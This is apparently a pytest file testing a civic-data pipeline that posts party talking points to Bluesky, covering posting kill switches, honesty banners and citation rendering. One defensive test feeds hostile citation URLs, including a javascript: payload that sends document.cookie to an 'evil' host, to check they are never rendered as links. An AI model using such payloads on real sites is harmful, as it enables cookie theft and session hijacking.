"""Wave-0 hardening tests (BUILDLOG Session-4 item 2 + docs/11-BUILD-PROGRAM.md §1).

Covers the launch-critical gate and the honesty/receipts fixes, plus the Session-5 review fixes:
  * POSTING_ENABLED kill-test — no path posts when the switch is off, regardless of creds.
  * FEATURES registry — dark by default; feature_on gates on the flag.
  * honesty banner (HIGH-2) — deterministic template output (and the legacy 'sonnet_batch' label)
    is disclosed as "not a language model"; only genuine LLM generators are production.
  * receipts (e) — verified talking points resolve to >=3 real (member, date, URL) rows that render;
    non-http(s) citation urls (MEDIUM-1) are never emitted as links.
  * quiet line (g) — thin days still cite the top synchronized phrase (as a measured phrase, unquoted).
  * P2 quote (f) + HIGH-1 — the quote is a clean VERBATIM fragment the verifier grounds against real
    speech, never the punctuation-stripped label; labels/top-phrase are never self-grounded.
  * posting day (a) — post day comes from the assemble manifest, not collect's focus_day.
  * posting main() — idempotent re-runs never double-post (MEDIUM-2); a thrown post still fires the
    dead-man because the error result carries creds_present (HIGH-3).
"""
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from pipeline import config, distill, post_bluesky, run_assemble, site, util  # noqa: E402


def _env(**kv):
    """Set env vars, returning a restore() that puts them back."""
    prev = {k: os.environ.get(k) for k in kv}
    for k, v in kv.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v

    def restore():
        for k, v in prev.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return restore


_DAY_JSON = {
    "day": "2026-06-30",
    "daily_lines": {"D": {"composite": "Today we spoke.", "generator": "sonnet_batch"},
                    "R": {"composite": "Today we also spoke.", "generator": "sonnet_batch"}},
    "top_synchronized": [{"party": "D", "ngram": "border security now", "day_peak": 5,
                          "first_seen": {"date": "2026-06-30"}}],
}


# --- POSTING_ENABLED kill-test (the launch switch) -----------------------------------------
def test_killtest_posting_disabled_never_posts_even_with_creds():
    """The core safety gate: creds present but POSTING_ENABLED off => no real post path, ever."""
    restore = _env(POSTING_ENABLED=None, BSKY_BLUE_HANDLE="blue.onscript.news",
                   BSKY_BLUE_PASSWORD="app-pass-xxxx")
    called = {"real": False}
    orig = post_bluesky._post_real
    post_bluesky._post_real = lambda *a, **k: (_ for _ in ()).throw(AssertionError("_post_real was called with posting disabled!"))
    try:
        assert config.posting_enabled() is False
        res = post_bluesky.post_party("2026-06-30", "D", _DAY_JSON)
        assert res["posted"] is False
        assert res["reason"] == "posting disabled"
        assert res["creds_present"] is True  # creds WERE present; the gate still held
    finally:
        post_bluesky._post_real = orig
        restore()


def test_posting_enabled_no_creds_is_dry_run():
    restore = _env(POSTING_ENABLED="true", BSKY_BLUE_HANDLE=None, BSKY_BLUE_PASSWORD=None)
    orig = post_bluesky._post_real
    post_bluesky._post_real = lambda *a, **k: (_ for _ in ()).throw(AssertionError("posted with no creds!"))
    try:
        res = post_bluesky.post_party("2026-06-30", "D", _DAY_JSON)
        assert res["posted"] is False and res["reason"] == "no creds (dry-run)"
    finally:
        post_bluesky._post_real = orig
        restore()


def test_posting_enabled_with_creds_reaches_real_path():
    """Positive direction: gate on + creds => the real path IS invoked (stubbed)."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="blue.onscript.news",
                   BSKY_BLUE_PASSWORD="app-pass-xxxx")
    orig = post_bluesky._post_real
    post_bluesky._post_real = lambda handle, pw, thread, party: {"party": party, "posted": True, "posts": len(thread)}
    try:
        res = post_bluesky.post_party("2026-06-30", "D", _DAY_JSON)
        assert res["posted"] is True and res["creds_present"] is True
    finally:
        post_bluesky._post_real = orig
        restore()


# --- FEATURES registry --------------------------------------------------------------------
def test_features_dark_by_default_and_gated():
    assert all(v is False for v in config.FEATURES.values()), "all backlog features must ship dark"
    assert config.feature_on("archive") is False
    assert config.feature_on("does_not_exist") is False
    config.FEATURES["archive"] = True
    try:
        assert config.feature_on("archive") is True
    finally:
        config.FEATURES["archive"] = False


# --- honesty banner (d) + HIGH-2 (deterministic stub must not pose as production Sonnet) ----
def test_real_llm_day_needs_no_banner():
    """A genuine LLM-voice day with a clean verifier shows no honesty banner."""
    live = {"daily_lines": {"D": {"composite": "x", "generator": "llm",
                                  "verifier": {"checked": True, "passed": True}},
                            "R": {"composite": "y", "generator": "llm",
                                  "verifier": {"checked": True, "passed": True}}}}
    need, msg, has_stub = site.honesty_state(live, None)
    assert need is False and has_stub is False
    assert site.banner_html(live, None) == ""


def test_deterministic_and_legacy_sonnet_batch_are_disclosed_as_stub():
    """HIGH-2: deterministic template output — and the legacy 'sonnet_batch' mislabel — is disclosed
    as 'not a language model', never presented as production Sonnet."""
    for gen in ("deterministic", "sonnet_batch"):
        day = {"daily_lines": {"D": {"composite": "x", "generator": gen,
                                     "verifier": {"checked": True, "passed": True}},
                               "R": {"composite": "y", "generator": gen,
                                     "verifier": {"checked": True, "passed": True}}}}
        need, msg, has_stub = site.honesty_state(day, None)
        assert need is True and has_stub is True, gen
        assert "not a language model" in site.banner_html(day, None), gen


def test_real_quiet_day_flags_without_stub_copy():
    """A genuine LLM day that is merely quiet gets a transparency flag, NOT the stub-voice copy."""
    quiet_live = {"daily_lines": {"D": {"composite": "x", "generator": "llm", "quiet": True,
                                        "verifier": {"checked": True, "passed": True}},
                                  "R": {"composite": "y", "generator": "llm",
                                        "verifier": {"checked": True, "passed": True}}}}
    need, msg, has_stub = site.honesty_state(quiet_live, None)
    assert need is True and has_stub is False and "quiet-day" in msg
    html = site.banner_html(quiet_live, None)
    assert "not a language model" not in html and "placeholder" not in html


def test_dry_run_is_disclosed_as_stub():
    dry = {"daily_lines": {"D": {"composite": "x", "generator": "dry_run"},
                           "R": {"composite": "y", "generator": "dry_run"}}}
    need, msg, has_stub = site.honesty_state(dry, None)
    assert need is True and has_stub is True and "dry-run stub" in msg
    assert "placeholder" in site.banner_html(dry, None)


def test_voice_flags_suppress_false_model_on_stub_generators():
    """Render-time honesty (fixes EVERY day page incl. historical): a non-production generator never
    stamps a model id — a stale 'claude-sonnet-5' would falsely claim LLM authorship and contradict
    the banner. A genuine production generator shows its model truthfully."""
    for gen, model in (("sonnet_batch", "claude-sonnet-5"), ("deterministic", "P2:deterministic"),
                       ("dry_run", "P2:dry_run")):
        joined = " ".join(site._voice_flags({"generator": gen, "model": model}))
        assert "deterministic template" in joined and "not a language model" in joined, gen
        assert "claude-sonnet-5" not in joined and model not in joined, gen
        assert "generator: sonnet_batch" not in joined, gen  # legacy mislabel never re-surfaced
    prod = " ".join(site._voice_flags({"generator": "llm", "model": "claude-sonnet-5"}))
    assert "generator: llm" in prod and "model: claude-sonnet-5" in prod
    assert site._voice_flags({}) == []  # no generator -> no flags


# --- receipts (e) -------------------------------------------------------------------------
def test_citations_resolve_three_members_with_urls():
    stmt_by_id = {
        "s1": {"member": {"bioguide": "A1", "party": "D", "state": "CA"}, "published_at": "2026-06-30",
               "url": "https://a1.house.gov/x"},
        "s2": {"member": {"bioguide": "B2", "party": "D", "state": "NY"}, "published_at": "2026-06-29",
               "url": "https://b2.house.gov/y"},
        "s3": {"member": {"bioguide": "C3", "party": "D", "state": "TX"}, "published_at": "2026-06-28",
               "url": "https://c3.senate.gov/z"},
    }
    tp = {"statements": ["s1", "s2", "s3"], "fragments": []}
    cites = run_assemble._citations(tp, stmt_by_id, {}, k=3)
    assert len(cites) == 3
    assert all(c["url"] and c["date"] and c["member"] for c in cites)
    assert {c["url"] for c in cites} == {"https://a1.house.gov/x", "https://b2.house.gov/y", "https://c3.senate.gov/z"}


def test_receipts_strip_renders_citation_links():
    tps = [{"member_count": 3, "fragments": [{"text": "protect the border"}], "topics": ["immigration"],
            "citations": [{"member": "Jane Doe", "party": "D", "state": "CA", "date": "2026-06-30",
                           "url": "https://doe.house.gov/press/x"}]}]
    html = site.receipts_strip("D", tps)
    assert 'href="https://doe.house.gov/press/x"' in html
    assert "Jane Doe" in html and "2026-06-30" in html


def test_receipts_strip_rejects_non_http_scheme_urls():
    """MEDIUM-1: a poisoned citation url (javascript:/data:) must NOT become a clickable link on a
    site that advertises zero JS. The row still renders (member/date), just with no href."""
    for bad in ("javascript:fetch('https://evil/'+document.cookie)", "data:text/html,<script>x</script>",
                "vbscript:msgbox", "  JavaScript:alert(1)"):
        tps = [{"member_count": 3, "fragments": [{"text": "protect the border"}], "topics": [],
                "citations": [{"member": "Mal Actor", "party": "D", "state": "CA",
                               "date": "2026-06-30", "url": bad}]}]
        html = site.receipts_strip("D", tps)
        assert "<a href" not in html, bad          # never emitted as a link
        assert "javascript" not in html.lower() and "vbscript" not in html.lower(), bad
        assert "Mal Actor" in html                 # the receipt row still shows


# --- quiet line (g) -----------------------------------------------------------------------
def test_quiet_line_cites_top_phrase_and_verifies():
    party_stmts = [{"id": f"s{i}", "text": "x", "member": {"bioguide": str(i), "party": "D"},
                    "published_at": "2026-06-30", "lane": 1} for i in range(10)]  # < QUIET_DAY_MAX
    top_phrase = {"text": "border security now", "members": 4}
    dl = distill.daily_line("D", "2026-06-30", party_stmts, [], top_phrase, {s["id"]: s for s in party_stmts})
    assert dl["quiet"] is True and dl["fallback"] is False
    assert dl["verifier"]["passed"] is True
    # HIGH-1: the top phrase is a code-computed ledger n-gram, cited as a MEASURED phrase (no quote
    # marks — it is not verbatim member speech), so nothing ungrounded is quoted and the line verifies.
    assert "border security now" in dl["composite"] and "4 of us" in dl["composite"]
    assert '"border security now"' not in dl["composite"]  # never rendered as a verbatim quote


# --- P2 quote selection (f) + HIGH-1 (quote must be verbatim, never the tokenized label) ---
def test_build_stats_quote_is_a_clean_verbatim_fragment_not_the_label():
    """The quote is verbatim member speech (the shortest, clean fragment), never the punctuation-
    stripped cluster label — so the blocking verifier can ground it against real text."""
    tp = {"label": "21st century road to housing", "member_count": 4,
          "fragments": [
              {"text": "who supports the 21st century road to housing act's historic passage today"},
              {"text": "the 21st century road to housing act"},  # shortest, clean, verbatim
          ], "topics": []}
    stats = distill.build_stats("D", "2026-06-30", 40, [tp], None)
    q = stats["talking_points"][0]["quote"]
    assert q == "the 21st century road to housing act"
    assert any(q in f["text"] for f in tp["fragments"])  # verbatim substring of real speech


def test_verifier_grounds_only_on_verbatim_fragments_not_labels():
    """HIGH-1 regression guard: the code-computed label is never quotable. A cluster whose label
    differs from its fragment only by punctuation quotes the FRAGMENT (with the comma) and verifies;
    the stripped label ('affordable accessible', no comma) never appears as a grounded quote."""
    tps = [{"id": "c1", "label": "support affordable accessible housing", "member_count": 3,
            "topics": [], "fragments": [{"text": "we support affordable, accessible housing for all"}]}]
    party_stmts = [{"id": f"s{i}", "text": "x", "member": {"bioguide": str(i), "party": "D"},
                    "published_at": "2026-06-30", "lane": 1} for i in range(60)]  # not quiet -> P2
    dl = distill.daily_line("D", "2026-06-30", party_stmts, tps, None, {s["id"]: s for s in party_stmts})
    assert dl["fallback"] is False and dl["verifier"]["passed"] is True
    assert "affordable, accessible" in dl["composite"]      # the verbatim fragment (with comma)
    assert "affordable accessible" not in dl["composite"]   # the stripped label is NOT quoted


# --- posting day resolution (a) -----------------------------------------------------------
def test_post_day_comes_from_assemble_manifest_not_collect():
    orig = post_bluesky.util.read_json
    post_bluesky.util.read_json = lambda p, default=None: {"day": "2099-01-01"}
    try:
        assert post_bluesky.resolve_day(None) == "2099-01-01"       # from assemble-latest
        assert post_bluesky.resolve_day("2030-05-05") == "2030-05-05"  # explicit --day wins
    finally:
        post_bluesky.util.read_json = orig


# --- main() integration: idempotency (MEDIUM-2) + dead-man on error (HIGH-3) ---------------
def _run_main_with(day, day_json, prior, post_real, ntfy_sink):
    """Drive post_bluesky.main() with all I/O stubbed. Returns the written post manifest."""
    from pathlib import Path as _P
    writes = {}

    def fake_read(p, default=None):
        name = _P(str(p)).name
        if name == "assemble-latest.json":
            return {"day": day}
        if name == f"{day}.json":
            return day_json
        if name == f"post-{day}.json":
            return prior
        return {} if default is None else default

    saved = (post_bluesky.util.read_json, post_bluesky.util.write_json,
             post_bluesky._post_real, post_bluesky.ops.ntfy, sys.argv)
    post_bluesky.util.read_json = fake_read
    post_bluesky.util.write_json = lambda p, obj: writes.__setitem__(_P(str(p)).name, obj)
    post_bluesky._post_real = post_real
    post_bluesky.ops.ntfy = lambda *a, **k: ntfy_sink.append((a, k))
    sys.argv = ["post", "--day", day]
    try:
        rc = post_bluesky.main()
    finally:
        (post_bluesky.util.read_json, post_bluesky.util.write_json,
         post_bluesky._post_real, post_bluesky.ops.ntfy, sys.argv) = saved
    return rc, writes.get(f"post-{day}.json", {})


def test_idempotency_skips_already_posted_party():
    """MEDIUM-2: a re-run never re-posts a party a prior run already posted; the other party still runs."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="blue.onscript.news",
                   BSKY_BLUE_PASSWORD="x", BSKY_RED_HANDLE="red.onscript.news", BSKY_RED_PASSWORD="y")
    day = "2026-06-30"
    day_json = {"day": day, "daily_lines": {"D": {"composite": "d"}, "R": {"composite": "r"}},
                "top_synchronized": []}
    prior = {"results": [{"party": "D", "posted": True}]}  # D already posted last run
    real_calls = []
    try:
        rc, manifest = _run_main_with(
            day, day_json, prior,
            post_real=lambda h, pw, thread, party: (real_calls.append(party) or
                                                    {"party": party, "posted": True, "posts": len(thread)}),
            ntfy_sink=[])
        assert rc == 0
        assert "D" not in real_calls and "R" in real_calls  # D skipped, R posted
        res = {r["party"]: r for r in manifest["results"]}
        assert res["D"].get("idempotent_skip") is True and res["D"]["posted"] is True
        assert res["R"]["posted"] is True
    finally:
        restore()


def test_symmetry_report_is_day_scoped_not_cumulative():
    """The nightly symmetry audit reports THIS DAY's ingestion/coverage, not cumulative corpus totals
    mislabeled under the day. caucus_size stays the full-corpus proxy, so coverage = share of the
    caucus that spoke that day. §Session-5."""
    from pipeline import ops
    stmts = (
        [{"member": {"party": "D", "bioguide": f"D{i}"}, "lane": 1, "published_at": "2026-07-13"} for i in range(3)]
        + [{"member": {"party": "D", "bioguide": "DOLD"}, "lane": 1, "published_at": "2025-01-01"}]  # older, must not count today
        + [{"member": {"party": "R", "bioguide": "R1"}, "lane": 1, "published_at": "2026-07-13"}]
    )
    saved = ops.util.write_json
    ops.util.write_json = lambda p, o: None  # no data/derived side effects in the test
    try:
        rep = ops.symmetry_report("2026-07-13", stmts, {}, freshness={}, degraded=False)
    finally:
        ops.util.write_json = saved
    d = rep["parties"]["D"]
    assert d["statements_ingested"] == 3      # only the day's 3, not the older 4th
    assert d["members_covered"] == 3          # D0,D1,D2 — DOLD did not speak today
    assert d["caucus_size"] == 4              # full corpus proxy still counts DOLD
    assert d["coverage_pct"] == 75.0          # 3 of the 4 known D members spoke that day
    assert rep["day"] == "2026-07-13"


def test_deadman_fires_when_a_creds_present_post_throws():
    """HIGH-3: if the real post throws (network/401/timeout) the dead-man MUST still fire — the
    error result carries creds_present so the missing-post detector sees it."""
    restore = _env(POSTING_ENABLED="1", BSKY_BLUE_HANDLE="blue.onscript.news",
                   BSKY_BLUE_PASSWORD="x", BSKY_RED_HANDLE="red.onscript.news", BSKY_RED_PASSWORD="y")
    day = "2026-06-30"
    day_json = {"day": day, "daily_lines": {"D": {"composite": "d"}, "R": {"composite": "r"}},
                "top_synchronized": []}
    ntfy_calls = []

    def boom(h, pw, thread, party):
        raise RuntimeError("bsky 500")

    try:
        rc, manifest = _run_main_with(day, day_json, {}, post_real=boom, ntfy_sink=ntfy_calls)
        assert rc == 0
        assert ntfy_calls, "dead-man must fire when a creds-present post throws"
        res = {r["party"]: r for r in manifest["results"]}
        assert res["D"]["creds_present"] is True and res["D"]["posted"] is False
        assert res["R"]["creds_present"] is True and res["R"]["posted"] is False
    finally:
        restore()
